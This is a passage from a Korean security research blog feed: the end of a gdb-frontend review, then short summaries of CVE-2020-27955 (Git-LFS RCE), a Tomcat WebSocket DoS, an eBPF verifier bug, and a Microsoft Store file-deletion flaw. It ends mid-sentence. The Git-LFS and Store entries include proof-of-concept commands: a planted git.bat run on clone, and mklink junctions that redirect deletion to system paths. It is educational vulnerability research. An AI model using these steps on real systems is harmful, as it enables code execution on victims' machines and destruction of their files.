&#xC81C;&#xC678;&#xD558;&#xBA74; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xAE30;&#xB2A5;&#xC744; gdb&#xC5D0; &#xC758;&#xC874;&#xD558;&#xACE0; &#xC788;&#xACE0;, &#xADF8;&#xB0E5; gdb&#xB9CC; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xACFC; &#xD06C;&#xAC8C; &#xB2E4;&#xB974;&#xB2E4;&#xB294; &#xB290;&#xB08C;&#xC740; &#xBC1B;&#xC9C0; &#xBABB;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. gdb&#xB97C; &#xC368;&#xBCF4;&#xC2E0; &#xBD84;&#xB4E4;&#xC740; &#xC544;&#xC2DC;&#xACA0;&#xC9C0;&#xB9CC; gdb&#xB9CC;&#xC744; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xB294; &#xBCC0;&#xD0DC;&#xB294; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC801;&#xC5B4;&#xB3C4; &#xD574;&#xD0B9; &#xC52C;&#xC5D0;&#xB294; &#xC5C6;&#xC744; &#xAC70;&#xC57C;. &#xBA54;&#xBAA8;&#xB9AC;&#xB098; register&#xAC12;&#xC758; &#xBCC0;&#xD654;&#xC5D0; &#xC9D1;&#xC911;&#xD558;&#xBA70; &#xB514;&#xBC84;&#xAE45;&#xD558;&#xB294; &#xC800;&#xC5D0;&#xAC8C; instruction &#xD558;&#xB098; &#xC2E4;&#xD589;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; <code>info reg</code> &#xAC19;&#xC740; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC785;&#xB825;&#xD558;&#xB77C;&#xACE0; &#xD55C;&#xB2E4;&#xBA74;&#x2026; &#xC5B4;&#xD6C4;&#x2026;</p><p>&#xADF8;&#xB7F0; &#xC810;&#xC744; gdb-frontend&#xAC00; &#xAC1C;&#xC120;&#xD574;&#xC8FC;&#xC9C4; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. UI&#xAC00; &#xC774;&#xC058;&#xAE34; &#xD558;&#xC9C0;&#xB9CC; &#xC800;&#xC5D0;&#xAC8C; &#xD544;&#xC694;&#xD55C; &#xBD80;&#xBD84;&#xC740; &#xAD6C;&#xD604;&#xC774; &#xC548;&#xB3FC; &#xC788;&#xC73C;&#xB2C8; &#x2018;&#xC774;&#xC05C; &#xC4F0;&#xB808;&#xAE30;&#x2019;&#xB77C;&#xB294; &#xB2E8;&#xC5B4;&#xB294; &#xC774;&#xB7F4; &#xB54C; &#xC4F0;&#xB294; &#xB9D0; &#xC774;&#xACA0;&#xC8E0;. &#xC815;&#xC791; Disassembly&#xB294; &#xD654;&#xBA74;&#xC5D0; &#xB450; &#xBC88;&#xC774;&#xB098; &#xCD9C;&#xB825;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#x314E;&#x314E;</p><blockquote><p>L0ch &#x66F0; : &#xC774;&#xC05C; &#xC4F0;&#xB808;&#xAE30;&#xB124; &#xC774;&#xC05C; &#xC4F0;&#xB808;&#xAE30;</p></blockquote><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/8.png" alt></p><p>gdb-frontend&#xB85C; CTF&#xBB38;&#xC81C; &#xD558;&#xB098; &#xD480;&#xACE0;, &#xC5F0;&#xAD6C; &#xAE00;&#xC744; &#xAC00;&#xC7A5;&#xD55C; write-up&#xC744; &#xC791;&#xC131;&#xD558;&#xB824; &#xD588;&#xC9C0;&#xB9CC; &#xB3C4;&#xC800;&#xD788; gdb-frontend&#xB9CC;&#xC73C;&#xB85C; &#xBB38;&#xC81C;&#xB97C; &#xD480; &#xC21C; &#xC5C6;&#xC744; &#xAC70; &#xAC19;&#xB124;&#xC694;. &#xADF8;&#xB798;&#xC11C; &#xC77C;&#xB9D0;&#xC758; &#xD76C;&#xB9DD;&#xC744; &#xAC16;&#xACE0; pwndbg&#xC640; &#xC5F0;&#xB3D9;&#xD574;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;&#xB9CC;, gdb-frontend&#xB294; &#xC8FC;&#xAC1D;&#xC804;&#xB3C4;&#xB97C; &#xD5C8;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. gdb-frontend&#xC758; ui&#xAC00; &#xC5C6;&#xC5B4;&#xC9C8; &#xC815;&#xB3C4;&#xB85C; terminal&#xC758; &#xD06C;&#xAE30;&#xB97C; &#xD0A4;&#xC6CC;&#xC57C; &#xD558;&#xACE0;,</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/9.png" alt></p><p>&#xBB34;&#xC5C7;&#xBCF4;&#xB2E4; gdb-frontend&#xAC00; &#xBED7;&#xC5B4;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xC81C;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xBA74;&#xC11C; crash &#xB098;&#xB294; &#xC0C1;&#xD669;&#xC740; 2&#xAC00;&#xC9C0; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xBD84;&#xC11D;&#xD558;&#xACE0; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; segmentation fault&#xB97C; &#xC77C;&#xC73C;&#xD0AC; &#xB54C;</li><li>&#xC874;&#xC7AC;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; attach &#xD560; &#xB54C;</li></ol><p>&#xC800;&#xC5D0;&#xAC90; &#xC774; &#xB450; &#xAC00;&#xC9C0; &#xC0C1;&#xD669; &#xBAA8;&#xB450; &#xB9E4;&#xC6B0; &#xD070; &#xB2E8;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. python exploit &#xCF54;&#xB4DC;&#xC5D0; &#xB530;&#xB77C; &#xB3D9;&#xC791;&#xD558;&#xACE0; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; gdb&#xB97C; attach &#xD574; &#xBD84;&#xC11D;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC8FC;&#xB41C; &#xC0AC;&#xC6A9;&#xBC29;&#xBC95;&#xC778;&#xB370;, &#xADF8;&#xAC8C; &#xC548;&#xB41C;&#xB2E4;&#xB2C8;&#xC694;&#x2026; &#xADF8;&#xB9AC;&#xACE0; segmentation fault&#xC5D0; &#xB300;&#xD55C; &#xC5B4;&#xB5A0;&#xD55C; &#xC815;&#xBCF4;&#xB3C4; &#xC5BB;&#xC744; &#xC218; &#xC5C6;&#xC73C;&#xB2C8; &#xCDE8;&#xC57D;&#xC810; &#xCC3E;&#xB294; &#xC785;&#xC7A5;&#xC5D0;&#xC120; &#xD654;&#xB531;&#xC9C0;&#xAC00; &#xC548; &#xB0A0; &#xC218;&#xAC00; &#xC5C6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xBB34;&#xB9AC;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;"></a>&#xB9C8;&#xBB34;&#xB9AC;</h1><ol><li>gdb&#xC758; &#xAE30;&#xB2A5;&#xC744; gui&#xB85C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;? <strong>No</strong><ul><li>&#xACB0;&#xAD6D; &#xBAA8;&#xB4E0; &#xB3D9;&#xC791;&#xC740; gdb terminal&#xC744; &#xD1B5;&#xD574; &#xC774;&#xB8E8;&#xC5B4;&#xC9D0;.</li><li>gui&#xB85C; gdb&#xB97C; &#xB2E4;&#xB8E8;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, gdb&#xC758; &#xACB0;&#xAD0F;&#xAC12;&#xC744; gui&#xB85C; &#xBCF4;&#xC5EC;&#xC8FC;&#xB294; &#xD50C;&#xB7EC;&#xADF8;&#xC778;</li><li>chrome&#xC73C;&#xB85C; gdb&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC70;&#xB77C; &#xC624;&#xD788;&#xB824; &#xBD88;&#xD3B8;&#xD568;</li></ul></li><li>pwnable&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB2E4;? <strong>No</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>gdb-frontend</tag>
      
      <tag>pwndbg</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27955: Git-LFS RCE Exploit</title>
    <link href="/2020/11/06/l0ch/2020-11-06/"/>
    <url>/2020/11/06/l0ch/2020-11-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://exploitbox.io/vuln/Git-Git-LFS-RCE-Exploit-CVE-2020-27955.html">Git-LFS RCE Exploit CVE-2020-27955</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Git &lt;= 2.29.2-git-lfs</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB300;&#xC6A9;&#xB7C9; &#xD30C;&#xC77C;&#xC744; &#xC5C5;&#xB85C;&#xB4DC; &#xD558;&#xAE30; &#xC704;&#xD574; github&#xC5D0;&#xC11C; &#xAC1C;&#xBC1C;&#xD55C; extension&#xC778; git-lfs(Large File Storage)&#xC5D0;&#xC11C; Windows&#xB97C; &#xB300;&#xC0C1;&#xC73C;&#xB85C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; git-lfs&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xD55C; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB294; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xD53C;&#xD574;&#xC790;&#xAC00; &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xBCF5;&#xC81C;&#xD560; &#xB54C; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC545;&#xC131; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC758; PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li><p>&#xACF5;&#xACA9;&#xC790;&#xB294; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xC2E4;&#xD589;&#xD560; &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD3EC;&#xD568;&#xD55C; <code>git.*</code> &#xC774;&#xB984;&#xC758; windows &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xD615;&#xC2DD; &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">git.bat : @<span class="hljs-built_in">echo</span> git-lfs RCE exploit!!git add git.bat</code></pre></li><li><p>&#xC800;&#xC7A5;&#xC18C;&#xC5D0; lfs &#xD30C;&#xC77C;&#xC744; &#xCD94;&#xAC00;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">git lfs track <span class="hljs-string">&quot;* .dat&quot;</span> git add .gitattributes<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;git exploit PoC&quot;</span>&gt; lfs.datgit add lfs.dat</code></pre></li><li><p>&#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC640; lfs &#xD30C;&#xC77C;&#xC744; &#xCEE4;&#xBC0B;&#xD558;&#xACE0; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xC5C5;&#xB85C;&#xB4DC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">git commit -a -m <span class="hljs-string">&quot;git-lfs exploit&quot;</span>git remote add origin https://repository_urlgit push -u origin master</code></pre></li><li><p>Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; clone&#xD560; &#xB54C; git-lfs &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xC5B4; &#xAE30;&#xC874; git &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB300;&#xC2E0; &#xACF5;&#xACA9;&#xC790;&#xC758; &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C;&#xC5D0;&#xC11C; clone&#xD55C; &#xC545;&#xC131; <code>git.bat</code>&#xC774; &#xC0AC;&#xC6A9;&#xC790; &#xC0C1;&#xD638;&#xC791;&#xC6A9; &#xC5C6;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">PowerShell&gt; git <span class="hljs-built_in">clone</span> https://repository_urlgit-lfs RCE exploit!!</code></pre></li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>git</tag>
      
      <tag>L0ch</tag>
      
      <tag>git lfs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-13935: Apache Tomcat Websocket 취약점</title>
    <link href="/2020/11/05/idioth/2020-11-05/"/>
    <url>/2020/11/05/idioth/2020-11-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.redteam-pentesting.de/2020/websocket-vulnerability-tomcat/">DIVING INTO A WEBSOCKET VULNERABILITY IN APACHE TOMCAT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache Tomcat<ul><li>10.0.0-M1 ~ 10.0.0-M6</li><li>9.0.0.M1 ~ 9.0.36</li><li>8.5.0 ~ 8.5.56</li><li>7.0.27 ~ 7.0.104</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Apache Tomcat&#xC758; WebSocket &#xD504;&#xB808;&#xC784;&#xC5D0;&#xC11C; <code>payloadLength</code>&#xC5D0; &#xC758;&#xD574; &#xBB34;&#xD55C; &#xB8E8;&#xD504;&#xAC00; &#xD2B8;&#xB9AC;&#xAC70; &#xB418;&#xC5B4; DoS &#xACF5;&#xACA9;&#xC73C;&#xB85C; &#xC5F0;&#xACB0;&#xB420; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><p><a href="https://tools.ietf.org/html/rfc6455#section-5.2">RFC6455</a>&#xC758; WebSocket &#xD504;&#xB808;&#xC784;&#xC5D0;&#xC11C; payload length &#xD544;&#xB4DC;&#xAC00; 127(2&#xC9C4;&#xC218; 1111111)&#xC774;&#xBA74; 64&#xBE44;&#xD2B8; &#xD655;&#xC7A5; payload length&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; payload length&#xB294; 64&#xBE44;&#xD2B8; unsigned integer&#xC774;&#xC9C0;&#xB9CC; RFC&#xC5D0;&#xC11C;&#xB294; &#xCD5C;&#xC0C1;&#xC704; &#xBE44;&#xD2B8;&#xAC00; &#xD56D;&#xC0C1; 0&#xC774; &#xB418;&#xB3C4;&#xB85D; &#xC694;&#xAD6C;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; payload length &#xD544;&#xB4DC;&#xB97C; 127&#xB85C; &#xC124;&#xC815;&#xD574;&#xC900; &#xD6C4; &#xB2E4;&#xC74C; 8&#xBC14;&#xC774;&#xD2B8;&#xC758; MSB&#xB97C; 1&#xB85C; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xAE30;&#xB9CC; &#xD558;&#xBA74; DoS &#xACF5;&#xACA9;&#xC744; &#xC218;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xD328;&#xCE58;&#xB294; <code>payloadLength</code>&#xAC00; &#xC74C;&#xC218;&#xAC00; &#xB420; &#xACBD;&#xC6B0; exception&#xC744; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0A4;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-comment">// The most significant bit of those 8 bytes is required to be zero</span><span class="hljs-comment">// (see RFC 6455, section 5.2). If the most significant bit is set,</span><span class="hljs-comment">// the resulting payload length will be negative so test for that.</span><span class="hljs-keyword">if</span> (payloadLength &lt; <span class="hljs-number">0</span>) {    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> WsIOException(        <span class="hljs-keyword">new</span> CloseReason(            CloseCodes.PROTOCOL_ERROR,            sm.getString(<span class="hljs-string">&quot;wsFrame.payloadMsbInvalid&quot;</span>)        )    );}</code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xAD00;&#xD55C; PoC Code&#xB294; <a href="https://github.com/RedTeamPentesting/CVE-2020-13935">&#xC5EC;&#xAE30;</a>&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>dos</tag>
      
      <tag>apache</tag>
      
      <tag>idioth</tag>
      
      <tag>tomcat</tag>
      
      <tag>websocket</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-27194: eBPF verifier bug</title>
    <link href="/2020/11/04/fabu1ous/2020-11-04/"/>
    <url>/2020/11/04/fabu1ous/2020-11-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://scannell.me/fuzzing-for-ebpf-jit-bugs-in-the-linux-kernel/">Fuzzing for eBPF JIT bugs in the Linux kernel</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Linux kernel</p><p>eBPF</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>eBPF&#xB294; &#xB7F0;&#xD0C0;&#xC784; &#xC911; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xCEE4;&#xB110; &#xCF54;&#xB4DC;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xAE30; &#xC704;&#xD574; Verifier&#xC640; BPF instruction&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. Verifier&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; &#xAC12;&#xC758; &#xBCC0;&#xD654;&#xC640; &#xADF8; &#xAC12;&#xB4E4;&#xC758; &#xD5C8;&#xC6A9; &#xBC94;&#xC704;(&#xC774;&#xD558; range)&#xB4F1;&#xC744; &#xD2B8;&#xB798;&#xD0B9;&#xD574;  memory load&#xC640; store&#xC758; out-of-bound &#xC5EC;&#xBD80;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xBA70;,  32-bit&#xC640; 64-bit &#xAC01;&#xAC01;&#xC758; range&#xB97C; &#xAD6C;&#xBD84;&#xD574; &#xAD00;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. OR&#xC5F0;&#xC0B0;&#xC774; &#xB05D;&#xB09C; &#xD6C4; &#xADF8;&#xC5D0; &#xB9DE;&#xAC8C;  32-bit &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC758; range&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD558;&#xB294; <code>scalar32_min_max_or()</code>&#xD568;&#xC218;&#xB294; &#xC774; &#xAD6C;&#xBD84;&#xC774; &#xD655;&#xC2E4;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xACE0;, &#xBC84;&#xADF8;&#xB97C; &#xC720;&#xBC1C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">/* ORing two positives gives a positive, so safe to</span><span class="hljs-comment">* cast result into s64.</span><span class="hljs-comment">*/</span>dst_reg-&gt;s32_min_value = dst_reg-&gt;umin_value;dst_reg-&gt;s32_max_value = dst_reg-&gt;umax_value;</code></pre><p>64-bit range&#xB97C; 32-bit range&#xB85C; casting &#xD558;&#xB294; <code>scalar32_min_max_or()</code>&#xC758; &#xCF54;&#xB4DC; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. Verifier&#xB294; <code>s32_min_value</code>&#xC640; <code>s32_max_value</code>&#xB97C; &#xC774;&#xC6A9;&#xD574; range&#xB97C; &#xD2B8;&#xB798;&#xD0B9; &#xD558;&#xB294;&#xB370;, &#xB9CC;&#xC57D; &#xC774; &#xB450; &#xAC12;&#xC774; &#xAC19;&#xB2E4;&#xBA74; &#xB808;&#xC9C0;&#xC2A4;&#xD130; &#xAC12;&#xC744; &#xC0C1;&#xC218;&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xACE0; &#xADF8;&#xC5D0; &#xB530;&#xB77C; &#xCF54;&#xB4DC;&#xAC00; &#xBD84;&#xAE30;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB9CC;&#xC57D; &#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; <code>dst_reg-&gt;umin_value</code>&#xAC00; 1&#xC774;&#xACE0;, <code>dst_reg-&gt;umax_value</code>&#xAC00; 25769803777&#xC774;&#xB77C;&#xBA74; <code>dst_reg-&gt;s32_min_value</code>&#xC640; <code>dst_reg-&gt;s32_max_value</code> &#xB458; &#xB2E4; 1&#xB85C; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xB97C; range&#xAC00; &#xC544;&#xB2CC; &#xC0C1;&#xC218;&#xB85C; &#xC778;&#xC2DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf">https://www.sosconhistory.net/soscon2018/pdf/day2_1100_3.pdf</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>ebpf</tag>
      
      <tag>bpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16877: Exploiting Microsoft Store Games</title>
    <link href="/2020/11/03/l0ch/11-03_1day1line/"/>
    <url>/2020/11/03/l0ch/11-03_1day1line/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.ioactive.com/2020/11/cve-2020-16877-exploiting-microsoft.html">CVE-2020-16877: Exploiting Microsoft Store Games</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 - Microsoft Store</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft Store&#xC5D0;&#xC11C; &#xBC30;&#xD3EC;&#xD558;&#xB294; UWP(Universal Windows platform) &#xC571;&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C;  <code>C:\Program Files\WindowsApps</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC5C6;&#xC73C;&#xBA70; Appx&#xB77C;&#xB294; &#xD615;&#xC2DD;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC571; &#xC124;&#xCE58; &#xAD00;&#xB9AC;&#xC790; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xD1B5;&#xD574;&#xC11C;&#xB9CC; &#xC124;&#xCE58;/&#xC81C;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC9C0;&#xB09C; 6&#xC6D4; Microsoft&#xB294; &#xAC8C;&#xC784; &#xC571;&#xC758; &#xBAA8;&#xB4DC;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC218;&#xC815;&#xC774; &#xAC00;&#xB2A5;&#xD55C; Windows &#xC571;&#xC744; &#xD638;&#xC2A4;&#xD305; &#xD558;&#xB294; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC778; <code>C:\ProgramFiles\ModifiableWindowsApps</code>&#xC744; &#xCD94;&#xAC00;&#xD588;&#xB294;&#xB370;, &#xC774; &#xAE30;&#xB2A5;&#xC5D0; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0AC;&#xC6A9;&#xD574; arbitrary file deletion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xB2E4;&#xB978; &#xC2DC;&#xC2A4;&#xD15C; &#xB4DC;&#xB77C;&#xC774;&#xBE0C; <code>D:\</code>&#xC5D0; pivot &#xD560; &#xACBD;&#xB85C;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0; windows &#xC800;&#xC7A5;&#xC18C; &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574; &#xAE30;&#xBCF8; &#xC800;&#xC7A5; &#xC704;&#xCE58;&#xB97C; <code>D:\</code> &#xB85C; &#xBCC0;&#xACBD;&#xD569;&#xB2C8;&#xB2E4;</li></ol><pre><code class="hljs powershell"><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\Program Files&quot;</span><span class="hljs-built_in">md</span> <span class="hljs-string">&quot;D :\pivot&quot;</span></code></pre><ol><li><p>Microsoft Store&#xC5D0;&#xC11C; &#xBAA8;&#xB4DC; &#xC9C0;&#xC6D0;&#xC774; &#xB418;&#xB294; &#xAC8C;&#xC784; &#xC571;&#xC744; &#xBC1B;&#xC544; &#xC124;&#xCE58;&#xD558;&#xBA74; <code>D:\Program Files\ModifiableWindowsApps</code> &#xD558;&#xC704;&#xC5D0; &#xD574;&#xB2F9; &#xC571;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xC774;&#xC911; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB97C; &#xC0DD;&#xC131;&#xD574; &#xC571;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xC758; &#xAD50;&#xCC28;&#xC810;&#xC774; &#xB418;&#xB3C4;&#xB85D; &#xB9CC;&#xB4E4;&#xACE0;, &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB85C; &#xB9AC;&#xB514;&#xB809;&#xC158; &#xD560; &#xCD5C;&#xC885; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB294; &#xC0AD;&#xC81C;&#xD560; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC758; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p></li></ol><pre><code class="hljs powershell">mklink / J <span class="hljs-string">&quot;D:\Program Files\ModifiableWindowsApps&quot;</span> <span class="hljs-string">&quot;D:\pivot&quot;</span>mklink / J <span class="hljs-string">&quot;D:\pivot\Game_App&quot;</span> <span class="hljs-string">&quot;C:\arbitrary_path\to_delete&quot;</span></code></pre><ol><li>&#xC571;&#xC744; &#xC0AD;&#xC81C;&#xD558;&#xBA74; &#xC774;&#xC911; &#xC2EC;&#xBCFC;&#xB9AD; &#xB9C1;&#xD06C;&#xB85C; &#xC778;&#xD574; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC784;&#xC758; &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C;&#xC774; 